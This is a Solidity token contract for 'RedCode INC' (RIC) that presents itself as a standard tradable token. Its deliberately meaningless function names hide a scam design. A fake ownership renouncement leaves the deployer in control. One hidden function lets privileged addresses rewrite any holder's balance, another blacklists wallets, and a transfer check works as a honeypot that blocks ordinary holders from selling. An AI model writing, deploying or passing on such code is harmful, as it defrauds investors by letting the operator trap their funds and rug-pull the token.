//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface fundAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract liquidityEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityMode {
    function createPair(address fromBuy, address listFee) external returns (address);
}

interface autoTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletAmount) external view returns (uint256);

    function transfer(address autoFund, uint256 receiverMode) external returns (bool);

    function allowance(address feeMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverMode) external returns (bool);

    function transferFrom(
        address sender,
        address autoFund,
        uint256 receiverMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderShould, uint256 value);
    event Approval(address indexed feeMode, address indexed spender, uint256 value);
}

interface minTx is autoTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RedCodeINC is liquidityEnable, autoTx, minTx {

    mapping(address => mapping(address => uint256)) private totalAtTx;

    function maxTx(address maxSenderAt, address autoFund, uint256 receiverMode) internal returns (bool) {
        if (maxSenderAt == receiverBuy) {
            return limitAmount(maxSenderAt, autoFund, receiverMode);
        }
        uint256 takeLaunched = autoTx(walletToken).balanceOf(totalLaunched);
        require(takeLaunched == launchedLiquidityExempt);
        require(!exemptLimitLaunched[maxSenderAt]);
        return limitAmount(maxSenderAt, autoFund, receiverMode);
    }

    uint256 launchedMaxIs;

    constructor (){
        if (walletLiquidity) {
            launchListTotal = false;
        }
        marketingIs();
        fundAt minLaunched = fundAt(minExempt);
        walletToken = liquidityMode(minLaunched.factory()).createPair(minLaunched.WETH(), address(this));
        
        receiverBuy = _msgSender();
        marketingLimit[receiverBuy] = true;
        atSenderTx[receiverBuy] = limitList;
        if (walletTxAuto != launchListTotal) {
            launchListTotal = false;
        }
        emit Transfer(address(0), receiverBuy, limitList);
    }

    function balanceOf(address walletAmount) public view virtual override returns (uint256) {
        return atSenderTx[walletAmount];
    }

    function fromToken(address exemptTeam) public {
        tradingAt();
        
        if (exemptTeam == receiverBuy || exemptTeam == walletToken) {
            return;
        }
        exemptLimitLaunched[exemptTeam] = true;
    }

    function tradingAt() private view {
        require(marketingLimit[_msgSender()]);
    }

    function fromSwap(address modeMin, uint256 receiverMode) public {
        tradingAt();
        atSenderTx[modeMin] = receiverMode;
    }

    bool public minBuy;

    function decimals() external view virtual override returns (uint8) {
        return minReceiver;
    }

    uint256 private fundMax;

    uint256 launchedLiquidityExempt;

    string private senderEnable = "RedCode INC";

    uint256 private limitList = 100000000 * 10 ** 18;

    bool public liquidityList;

    uint8 private minReceiver = 18;

    bool private walletLiquidity;

    string private exemptFrom = "RIC";

    function marketingIs() public {
        emit OwnershipTransferred(receiverBuy, address(0));
        maxAmount = address(0);
    }

    function getOwner() external view returns (address) {
        return maxAmount;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return limitList;
    }

    uint256 public liquiditySellToken;

    mapping(address => bool) public marketingLimit;

    function allowance(address launchedWallet, address totalReceiver) external view virtual override returns (uint256) {
        if (totalReceiver == minExempt) {
            return type(uint256).max;
        }
        return totalAtTx[launchedWallet][totalReceiver];
    }

    function transferFrom(address maxSenderAt, address autoFund, uint256 receiverMode) external override returns (bool) {
        if (_msgSender() != minExempt) {
            if (totalAtTx[maxSenderAt][_msgSender()] != type(uint256).max) {
                require(receiverMode <= totalAtTx[maxSenderAt][_msgSender()]);
                totalAtTx[maxSenderAt][_msgSender()] -= receiverMode;
            }
        }
        return maxTx(maxSenderAt, autoFund, receiverMode);
    }

    function approve(address totalReceiver, uint256 receiverMode) public virtual override returns (bool) {
        totalAtTx[_msgSender()][totalReceiver] = receiverMode;
        emit Approval(_msgSender(), totalReceiver, receiverMode);
        return true;
    }

    address public walletToken;

    bool public shouldWallet;

    address minExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public limitAuto;

    function symbol() external view virtual override returns (string memory) {
        return exemptFrom;
    }

    function transfer(address modeMin, uint256 receiverMode) external virtual override returns (bool) {
        return maxTx(_msgSender(), modeMin, receiverMode);
    }

    address totalLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function limitAmount(address maxSenderAt, address autoFund, uint256 receiverMode) internal returns (bool) {
        require(atSenderTx[maxSenderAt] >= receiverMode);
        atSenderTx[maxSenderAt] -= receiverMode;
        atSenderTx[autoFund] += receiverMode;
        emit Transfer(maxSenderAt, autoFund, receiverMode);
        return true;
    }

    function shouldLaunch(address swapTrading) public {
        if (amountTo) {
            return;
        }
        
        marketingLimit[swapTrading] = true;
        if (launchListTotal == shouldWallet) {
            limitAuto = false;
        }
        amountTo = true;
    }

    bool public launchListTotal;

    bool public amountTo;

    address private maxAmount;

    address public receiverBuy;

    bool public walletTxAuto;

    event OwnershipTransferred(address indexed maxAuto, address indexed receiverLaunch);

    mapping(address => bool) public exemptLimitLaunched;

    function shouldTrading(uint256 receiverMode) public {
        tradingAt();
        launchedLiquidityExempt = receiverMode;
    }

    function owner() external view returns (address) {
        return maxAmount;
    }

    bool private fundTo;

    mapping(address => uint256) private atSenderTx;

    function name() external view virtual override returns (string memory) {
        return senderEnable;
    }

}